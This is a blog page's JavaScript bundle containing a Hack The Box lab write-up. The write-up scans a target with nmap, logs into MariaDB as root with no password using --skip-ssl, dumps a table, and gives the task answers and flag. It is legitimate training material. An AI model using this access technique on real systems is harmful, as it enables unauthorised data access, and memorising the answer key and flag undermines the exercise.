"use strict";(globalThis.webpackChunkmy_own_blog=globalThis.webpackChunkmy_own_blog||[]).push([[4403],{28453:(e,n,r)=>{r.d(n,{R:()=>o,x:()=>a});var t=r(96540);const s={},i=t.createContext(s);function o(e){const n=t.useContext(i);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),t.createElement(i.Provider,{value:n},e.children)}},29580:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>o,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"hack-the-box/starting-point/tier-1/sequel","title":"Sequel","description":"- Difficulty: Very easy","source":"@site/docs/hack-the-box/starting-point/tier-1/2-sequel.mdx","sourceDirName":"hack-the-box/starting-point/tier-1","slug":"/hack-the-box/starting-point/tier-1/sequel","permalink":"/my-small-blog/docs/hack-the-box/starting-point/tier-1/sequel","draft":false,"unlisted":false,"tags":[{"inline":false,"label":"Linux","permalink":"/my-small-blog/docs/tags/linux","description":"Includes write-ups on the topic of Linux"},{"inline":false,"label":"Network","permalink":"/my-small-blog/docs/tags/network","description":"Includes write-ups on the topic of Network"}],"version":"current","sidebarPosition":2,"frontMatter":{"tags":["linux","network"],"sidebar_position":2},"sidebar":"writeupsSidebar","previous":{"title":"Appointment","permalink":"/my-small-blog/docs/hack-the-box/starting-point/tier-1/appointment/"},"next":{"title":"Crocodile","permalink":"/my-small-blog/docs/hack-the-box/starting-point/tier-1/crocodile/"}}');var s=r(74848),i=r(28453);const o={tags:["linux","network"],sidebar_position:2},a="Sequel",l={},c=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\u270f\ufe0f Task answers",id:"\ufe0f-task-answers",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function d(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"sequel",children:"Sequel"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Difficulty:"})," Very easy"]}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,s.jsx)(n.p,{children:"With the target IP in hand I ran a full-port, fast service/version scan to discover any database services:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'> nmap -p- -sV -sC --min-rate 5000 10.129.2.30 \r\n\r\nPORT     STATE SERVICE VERSION\r\n3306/tcp open  mysql?\r\n| mysql-info: \r\n|   Protocol: 10\r\n|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1\r\n|   Thread ID: 66\r\n|   Capabilities flags: 63486\r\n|   Some Capabilities: ConnectWithDatabase, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, InteractiveClient, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, LongColumnFlag, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, FoundRows, ODBCClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments\r\n|   Status: Autocommit\r\n|   Salt: *1WE2h8{&Fp"RWA}uS}<\r\n|_  Auth Plugin Name: mysql_native_password\n'})}),"\n",(0,s.jsxs)(n.p,{children:["The scan identified a database service on port ",(0,s.jsx)(n.code,{children:"3306"})," and the banner indicates MariaDB ",(0,s.jsx)(n.code,{children:"10.3.27"})," (reported as ",(0,s.jsx)(n.code,{children:"5.5.5-10.3.27-MariaDB"}),").\r\nIn CTF/lab scenarios it's common to find misconfigured MySQL/MariaDB instances where administrative accounts have weak or empty passwords."]}),"\n",(0,s.jsxs)(n.p,{children:["I attempted to connect as ",(0,s.jsx)(n.code,{children:"root"})," with a simple client command but received an SSL/TLS-related error:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> mysql -h 10.129.2.30 -u root \r\nERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it\n"})}),"\n",(0,s.jsxs)(n.p,{children:["The client was insisting on TLS while the server didn't support it;\r\nadding ",(0,s.jsx)(n.code,{children:"--skip-ssl"})," to the client command bypasses that client-side requirement and allowed me to connect as ",(0,s.jsx)(n.code,{children:"root"})," without a password:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"> mysql -h 10.129.2.30 -u root --skip-ssl\r\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\r\nYour MariaDB connection id is 75\r\nServer version: 10.3.27-MariaDB-0+deb10u1 Debian 10\r\n\r\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\r\n\r\nSupport MariaDB developers by giving a star at https://github.com/MariaDB/server\r\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\r\n\r\nMariaDB [(none)]> \n"})}),"\n",(0,s.jsxs)(n.p,{children:["Once in the MariaDB monitor I listed the available databases (remembering to terminate SQL statements with ",(0,s.jsx)(n.code,{children:";"}),"):"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"MariaDB [(none)]> SHOW DATABASES;\r\n+--------------------+\r\n| Database           |\r\n+--------------------+\r\n| htb                |\r\n| information_schema |\r\n| mysql              |\r\n| performance_schema |\r\n+--------------------+\r\n4 rows in set (0.273 sec)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["There were four databases; three (",(0,s.jsx)(n.code,{children:"information_schema"}),", ",(0,s.jsx)(n.code,{children:"mysql"}),", ",(0,s.jsx)(n.code,{children:"performance_schema"}),") are system databases created by MySQL/MariaDB, while ",(0,s.jsx)(n.code,{children:"htb"})," is a user-created database so I switched to it:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"MariaDB [(none)]> USE htb;\r\nReading table information for completion of table and column names\r\nYou can turn off this feature to get a quicker startup with -A\r\n\r\nDatabase changed\n"})}),"\n",(0,s.jsxs)(n.p,{children:["I enumerated the tables in ",(0,s.jsx)(n.code,{children:"htb"})," and found ",(0,s.jsx)(n.code,{children:"config"})," and ",(0,s.jsx)(n.code,{children:"users"}),".\r\nA full table dump with ",(0,s.jsx)(n.code,{children:"SELECT * FROM <table_name>;"})," on ",(0,s.jsx)(n.code,{children:"config"})," returned a row containing the flag:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"MariaDB [htb]> SELECT * FROM config;\r\n+----+-----------------------+----------------------------------+\r\n| id | name                  | value                            |\r\n+----+-----------------------+----------------------------------+\r\n|  1 | timeout               | 60s                              |\r\n|  2 | security              | default                          |\r\n|  3 | auto_logon            | false                            |\r\n|  4 | max_size              | 2M                               |\r\n|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |\r\n|  6 | enable_uploads        | false                            |\r\n|  7 | authentication_method | radius                           |\r\n+----+-----------------------+----------------------------------+\r\n7 rows in set (0.270 sec)\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\ufe0f-task-answers",children:"\u270f\ufe0f Task answers"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Task 1: During our scan, which port do we find serving MySQL?"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"3306"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Task 2: What community-developed MySQL version is the target running?"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"MariaDB"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Task 3: When using the MySQL command line client, what switch do we need to use in order to specify a login username?"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"-u"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Task 4: Which username allows us to log into this MariaDB instance without providing a password?"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"root"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Task 5: In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"*"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Task 6: In SQL, what symbol do we need to end each query with?"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:";"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Task 7: There are three databases in this MySQL instance that are common across all MySQL instances.\r\nWhat is the name of the fourth that's unique to this host?"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"htb"}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"7b4bec00d1a39e3dd4e021ec3d915da8"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}}}]);